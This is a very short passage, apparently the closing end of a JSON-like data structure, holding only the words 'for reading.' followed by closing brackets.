for reading." } ]
